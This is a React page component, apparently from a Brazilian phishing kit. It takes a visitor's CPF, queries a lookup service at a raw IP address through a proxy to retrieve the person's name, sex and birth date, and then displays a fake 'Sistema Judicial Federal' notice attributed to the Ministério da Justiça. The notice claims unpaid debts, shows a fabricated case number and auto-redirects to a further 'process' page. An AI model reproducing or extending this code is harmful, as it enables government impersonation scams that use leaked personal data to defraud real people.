import { useEffect, useMemo, useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import logo from "../assets/logo.png"; // use se tiver o arquivo local

type Dados = { cpf: string; nome: string; sexo?: string; nascimento?: string };

const API_URL =
  import.meta.env.VITE_CPF_API_URL ??
  "https://proxy-1mu0.onrender.com/http://185.101.104.231:3001/search";

function gerarNumeroProcesso(cpf: string) {
  // só para demo visual — troque pelo número real se sua API retornar
  const d = cpf.replace(/\D/g, "");
  const base = d.slice(0, 7).padEnd(7, "0");
  return `Processo Judicial Nº ${base}.89.2024.8.26.0000`;
}

export default function Consultando() {
  const { search } = useLocation();
  const navigate = useNavigate();
  const cpf = useMemo(() => new URLSearchParams(search).get("cpf") ?? "", [search]);

  const [dados, setDados] = useState<Dados | null>(null);
  const [erro, setErro] = useState<string | null>(null);
  const [tempoRestante, setTempoRestante] = useState(30);

  useEffect(() => {
    if (!cpf || cpf.replace(/\D/g, "").length !== 11) {
      setErro("CPF ausente ou inválido.");
      return;
    }
    const fetchResultado = async () => {
      try {
        const url = `${API_URL}?cpf=${cpf}`;
        const res = await fetch(url);
        if (!res.ok) throw new Error("Erro ao buscar CPF");
        const text = await res.text();
        const [cpfRetorno, nome, sexo, nascimento] = text.replace("%", "").split("|");
        setDados({ cpf: cpfRetorno, nome, sexo, nascimento });
      } catch {
        setErro("Não foi possível obter o resultado.");
      }
    };
    fetchResultado();
  }, [cpf]);

  // inicia a contagem apenas quando os dados chegarem; ao chegar em 0, redireciona
  useEffect(() => {
    if (!dados) return;
    setTempoRestante(30);
    const timer = setInterval(() => {
      setTempoRestante((p) => {
        if (p <= 1) {
          clearInterval(timer);
          navigate(`/processo?cpf=${dados.cpf}`);
          return 0;
        }
        return p - 1;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, [dados, navigate]);

  return (
    <div className="min-h-screen bg-gray-50 text-gray-900">
      <div className="mx-auto flex min-h-screen max-w-3xl flex-col items-center justify-center px-6 sm:px-6">
        {!dados && !erro && (
          <>
            {/* logo */}
            <img
              src={logo}
              alt=""
              className="mb-6 h-20 w-30"
            />
            <h1 className="text-xl font-semibold text-[#0b3d73]">Consultando Dados</h1>
            <div className="mt-6 h-8 w-8 animate-spin rounded-full border-4 border-gray-300 border-t-[#0b3d73]" />
            <p className="mt-4 text-center text-gray-600">
              Por favor, aguarde enquanto localizamos suas informações judiciais.
            </p>
          </>
        )}

        {erro && (
          <div className="w-full max-w-xl rounded-lg border border-red-200 bg-red-50 px-4 py-3 text-sm text-red-700">
            {erro}
          </div>
        )}

        {dados && (
          <div className="w-full rounded-2xl bg-white p-6 sm:p-10 shadow-xl ring-1 ring-black/5">
            {/* topo com logo */}
            <div className="flex flex-col items-center">
              <img
                src={logo}
                alt=""
                className="mb-4 h-16 w-25"
              />
              <h1 className="text-center text-[20px] font-semibold tracking-wide text-gray-900">
                SISTEMA JUDICIAL FEDERAL
              </h1>
              <p className="mt-1 text-center text-sm text-gray-500">
                Notificação Oficial sobre Pendência Judicial
              </p>
            </div>

            {/* corpo do texto */}
            <div className="mt-8 space-y-4 text-[15px] leading-relaxed text-gray-800">
              <p>
                Olá,{" "}
                <span className="font-semibold">
                  {dados.nome}
                </span>
                ,
              </p>
              <p>
                Identificamos registros vinculados ao seu CPF que indicam pendências financeiras não quitadas.
              </p>
              <p>
                Essas pendências deram origem a um <span className="font-semibold">processo judicial em andamento</span>, em fase de execução fiscal, conforme a legislação vigente.
              </p>
              <p>
                Recomendamos que acesse os detalhes do processo para ciência e providências cabíveis em fase administrativa.
              </p>
            </div>

            {/* bloco com número do processo e botão */}
            <div className="mt-8 rounded-xl border border-gray-200 bg-gray-50 p-6">
              <p className="text-center text-sm text-gray-700">
                {gerarNumeroProcesso(dados.cpf)}
              </p>

              <div className="mt-5 flex flex-col items-center gap-3">
                <button
                  onClick={() => navigate(`/processo?cpf=${dados.cpf}`)}
                  className="rounded-lg bg-[#c01610] px-6 py-3 text-sm font-semibold text-white shadow hover:bg-[#a9130e] focus:outline-none focus:ring-2 focus:ring-red-400"
                >
                  ACESSAR DETALHES DO PROCESSO
                </button>
                <p className="text-xs text-gray-500">
                  Você será redirecionado automaticamente em {tempoRestante}s
                </p>
              </div>
            </div>

            {/* rodapé */}
            <p className="mt-10 text-center text-xs text-gray-500">
              © 2025 Ministério da Justiça - Governo Federal
            </p>
          </div>
        )}
      </div>
    </div>
  );
}
